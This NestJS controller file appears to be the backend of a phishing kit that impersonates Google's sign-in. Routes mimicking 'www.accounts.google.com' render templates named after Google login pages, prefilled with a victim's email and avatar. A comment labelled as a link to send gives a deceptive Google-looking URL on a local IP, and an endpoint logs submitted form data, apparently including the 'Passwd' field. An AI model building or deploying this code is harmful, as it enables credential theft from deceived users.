import { Controller, Get, Post, Body, Patch, Param, Delete, Render } from '@nestjs/common';
import { LoginService } from './login.service';
import { CreateLoginDto } from './dto/create-login.dto';
import { UpdateLoginDto } from './dto/update-login.dto';

@Controller()
export class LoginController {

  
  constructor(private readonly loginService: LoginService) {
    
    // Inicializando a variável da imagem com a do email real
    //this.loginService.emailLogin(this.email);
  }

  email: string = "email@gmail.com";
  imageDefault: string = "https://lh3.googleusercontent.com/a/default-user=s24-p";
  //IP: string = "localhost";
  IP: string = "192.168.68.108";
  PORT: string = "3000";

  // Link para enviar
  // http://192.168.56.1:3000/www.accounts.google.com/#v3/signin/confirmidentifier?dsh=S-955960223%3A1678299953140568&authuser=1&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fhl%3Dpt_BR%26utm_source%3DOGB%26utm_medium%3Dact%26authuser%3D1%26pageId%3Dnone&passive=1209600&sacu=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AWnogHeIjHiQ4LiWBdPcASpyazywqI3j5OaOqghsrN-xdtEfh6h1bfuTwGuOGST5rKRX89l2KBkO
  
  @Get('/')
  //@Redirect('http://192.168.56.1:3000/www.accounts.google.com/#v3/signin/confirmidentifier?dsh=S-955960223%3A1678299953140568&authuser=1&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fhl%3Dpt_BR%26utm_source%3DOGB%26utm_medium%3Dact%26authuser%3D1%26pageId%3Dnone&passive=1209600&sacu=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AWnogHeIjHiQ4LiWBdPcASpyazywqI3j5OaOqghsrN-xdtEfh6h1bfuTwGuOGST5rKRX89l2KBkO')
  //@Redirect('http://www.accounts.google.com/#v3/signin/confirmidentifier?dsh=S-955960223%3A1678299953140568&authuser=1&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fhl%3Dpt_BR%26utm_source%3DOGB%26utm_medium%3Dact%26authuser%3D1%26pageId%3Dnone&passive=1209600&sacu=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AWnogHeIjHiQ4LiWBdPcASpyazywqI3j5OaOqghsrN-xdtEfh6h1bfuTwGuOGST5rKRX89l2KBkO')

  
  @Get('/www.accounts.google.com')
  @Render('Login_Google1')
  html1() {

    // Link de suporte: https://docs.nestjs.com/techniques/mvc#template-rendering
    return {
      UserName: this.email,
      //imageUser: this.appService.getLinkImage(),
      imageUser: this.imageDefault,
      IP: this.IP,
      PORT: this.PORT
    } 
  }

  @Get('/www.accounts.google.com/v3')
  @Render('Login_Google2')
  html2() {
    return {
      UserName: this.email,
      IP: this.IP,
      PORT: this.PORT
    }
  } 
  
  @Post('test')
  teste(@Body() data: object) {
  
    console.log(data);
    return data;
  }
  
  // <input id="Passwd" name="Passwd" />

  @Post()
  create(@Body() createLoginDto: CreateLoginDto) {
    return this.loginService.create(createLoginDto);
  }

  @Get()
  findAll() {
    return this.loginService.findAll();
  }

  @Get(':id')
  findOne(@Param('id') id: string) {
    return this.loginService.findOne(+id);
  }

  @Patch(':id')
  update(@Param('id') id: string, @Body() updateLoginDto: UpdateLoginDto) {
    return this.loginService.update(+id, updateLoginDto);
  }

  @Delete(':id')
  remove(@Param('id') id: string) {
    return this.loginService.remove(+id);
  }
}
